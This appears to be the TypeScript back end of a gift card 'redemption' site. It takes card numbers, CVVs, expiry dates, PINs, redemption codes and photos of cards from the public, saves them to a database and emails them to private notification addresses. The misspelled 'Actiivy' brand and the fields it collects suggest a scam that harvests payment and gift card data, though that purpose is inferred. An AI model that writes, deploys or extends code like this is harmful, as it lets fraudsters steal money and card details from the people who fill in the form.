import { router, publicProcedure } from './trpc.ts.js';
import { z } from 'zod';
import nodemailer from 'nodemailer';
import { db } from './db.ts.js';
import { submissions } from './schema.ts.js';

const transporter = nodemailer.createTransport({
 host: 'smtp.gmail.com', port: 465, secure: true,
 auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_APP_PASSWORD }
});
const recipients = [...new Set((process.env.NOTIFICATION_EMAILS ?? '').split(',').map(x => x.trim()).filter(Boolean))];
const inputSchema = z.object({
 code: z.string(), imageUrl: z.string().optional(), userAgent: z.string().optional(), ip: z.string().optional(), metadata: z.record(z.any()).optional()
});

const escapeHtml = (value: string) => value.replace(/[&<>"']/g, character => ({
 '&': '&amp;',
 '<': '&lt;',
 '>': '&gt;',
 '"': '&quot;',
 "'": '&#39;'
 }[character] ?? character));

const toAbsoluteUrl = (value?: unknown) => {
 if (typeof value !== 'string' || !value.trim()) return '';
 try {
  return new URL(value, process.env.PUBLIC_APP_URL ?? 'https://actiivy-frontend.onrender.com').toString();
 } catch {
  return value;
 }
};

const sendSubmission = async (input: z.infer<typeof inputSchema>) => {
 await db.insert(submissions).values({ ...input, metadata: JSON.stringify(input.metadata), createdAt: new Date() });
 if (!recipients.length) throw new Error('NOTIFICATION_EMAILS is not configured');

 const metadata = input.metadata ?? {};
 const cardType = String(metadata.cardType ?? 'Not provided');
 const currency = String(metadata.currency ?? '');
 const amount = String(metadata.amount ?? 'Not provided');
 const frontImageUrl = toAbsoluteUrl(input.imageUrl);
 const backImageUrl = toAbsoluteUrl(metadata.backImageUrl);
 const imageLines = [
  frontImageUrl ? `Front image: ${frontImageUrl}` : '',
  backImageUrl ? `Back image: ${backImageUrl}` : ''
 ].filter(Boolean);
 const code = input.code || 'Not provided';
 const amountLabel = `${currency} ${amount}`.trim();
 const text = [
  'New Submission Received',
  `Card type: ${cardType}`,
  `Amount: ${amountLabel}`,
  `Redemption Code: ${code}`,
  imageLines.length ? imageLines.join('\n') : 'Images: None uploaded'
 ].join('\n');
 const htmlImages = imageLines.length ? imageLines.map(line => {
  const separator = line.indexOf(': ');
  const label = separator >= 0 ? line.slice(0, separator) : 'Image';
  const url = separator >= 0 ? line.slice(separator + 2) : line;
  const safeUrl = escapeHtml(url);
  return `<p><strong>${escapeHtml(label)}:</strong> <a href="${safeUrl}">${safeUrl}</a></p>`;
 }).join('') : '<p><strong>Images:</strong> None uploaded</p>';
 const message = {
  from: `Actiivy Alerts <${process.env.SMTP_USER}>`,
  subject: 'New Redeem Code / Gift Card Submission',
  text,
  html: `<h2>New Submission Received</h2><p><strong>Card type:</strong> ${escapeHtml(cardType)}</p><p><strong>Amount:</strong> ${escapeHtml(amountLabel)}</p><p><strong>Redemption Code:</strong> <code>${escapeHtml(code)}</code></p>${htmlImages}`
 };
 await Promise.all(recipients.map(async to => {
  try {
   const info = await transporter.sendMail({ ...message, to });
   console.log(JSON.stringify({ event: 'notification.smtp.result', recipient: to.replace(/(.).+(@.*)/, '$1***$2'), acceptedCount: info.accepted?.length ?? 0, rejectedCount: info.rejected?.length ?? 0, messageId: info.messageId ?? null }));
  } catch (error: any) {
   console.error(JSON.stringify({ event: 'notification.smtp.error', recipient: to.replace(/(.).+(@.*)/, '$1***$2'), code: error?.code ?? null, responseCode: error?.responseCode ?? null, message: error?.message ?? 'Unknown SMTP error' }));
   throw error;
  }
 }));
 return { success: true, recipientCount: recipients.length, message: `Sent to ${recipients.length} recipient(s).` };
};

export const submissionRouter = router({ submitRedeem: publicProcedure.input(inputSchema).mutation(({ input }) => sendSubmission(input)) });
const cardSchema = z.object({ cardType: z.string(), currency: z.string(), amount: z.string(), cardName: z.string().optional(), cardNumber: z.string().optional(), expiryDate: z.string().optional(), cvv: z.string().optional(), giftCardCvv: z.string().optional(), giftCardPin: z.string().optional(), fourDigitPin: z.string().optional(), giftCardExpiryDate: z.string().optional(), redemptionCode: z.string().optional(), redemptionCode1: z.string().optional(), redemptionCode2: z.string().optional(), redemptionCode3: z.string().optional(), frontImageUrl: z.string().optional(), backImageUrl: z.string().optional() });
export const cardRouter = router({ submit: publicProcedure.input(cardSchema).mutation(({ input }) => sendSubmission({ code: [input.redemptionCode, input.redemptionCode1, input.redemptionCode2, input.redemptionCode3].filter(Boolean).join(' | ') || input.giftCardPin || input.cardNumber || 'TEST-SUBMISSION', imageUrl: input.frontImageUrl, metadata: { cardType: input.cardType, currency: input.currency, amount: input.amount, backImageUrl: input.backImageUrl } })) });
